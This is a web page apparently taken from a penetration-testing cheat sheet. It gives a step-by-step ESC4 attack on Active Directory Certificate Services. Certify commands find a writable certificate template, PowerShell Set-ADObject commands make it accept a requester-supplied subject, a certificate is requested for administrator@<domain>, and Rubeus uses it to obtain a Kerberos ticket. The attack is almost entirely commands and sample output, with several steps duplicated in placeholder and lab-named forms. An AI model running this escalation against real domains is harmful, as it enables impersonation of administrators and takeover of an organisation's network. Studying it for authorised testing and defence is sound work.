title: ESC4: Vulnerable Certificate Template ACL
html:
Conditions: You have WriteProperty, WriteOwner, or WriteDacl on a certificate template object. Strategy: modify template to enable ESC1 conditions → exploit → clean up.

Step 1 — Enumerate + Identify Writable Template

Certify.exe find /vulnerable
Certify.exe find /vulnerable

    Template Name                 : ESC4
    pkiextendedkeyusage           : Client Authentication
    Enrollment Rights             : ESSOS\Domain Users    Access: Allow
    Object Control Permissions
      WriteProperty Principals    : ESSOS\<username>     Access: Allow

Step 2 — Modify Template to Enable ENROLLEE_SUPPLIES_SUBJECT

# Backup template
Get-ADObject "CN=<template>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=local" -Properties * | Export-Clixml backup.xml

# Enable ENROLLEE_SUPPLIES_SUBJECT flag
$t = Get-ADObject "CN=<template>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=local"
Set-ADObject $t.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}
Start-Sleep -Seconds 30
# Backup original template
Get-ADObject "CN=ESC4,CN=Certificate Templates,..." -Properties * | Export-Clixml ESC4-backup.xml

# Modify template to enable ENROLLEE_SUPPLIES_SUBJECT
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,..."
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}
Start-Sleep -Seconds 30

Step 3 — Request Certificate with Arbitrary SAN

Certify.exe request /ca:<ca-host>\<ca-name> /template:<template> /altname:upn:<target-user>@<domain>
Certify.exe request /ca:<domain>\<ca> /template:ESC4 /altname:upn:administrator@<domain>

[*] AltName   : administrator@<domain>
[*] CA Response : The certificate has been issued.
[*] Request ID  : 11

Step 4 — Authenticate

Rubeus.exe asktgt /user:<target-user> /certificate:<target-user>.pfx

Step 5 — Restore Template (Cleanup!)

$t = Get-ADObject "CN=<template>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=local"
Set-ADObject $t.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}
# IMPORTANT: Restore original template after attack
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,..."
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}
excerpt: Conditions: You have WriteProperty , WriteOwner , or WriteDacl on a certificate template object. Strategy: modify template to enable ESC1 conditions → exploit → clean up. Step 1 — Enumerate + Identify
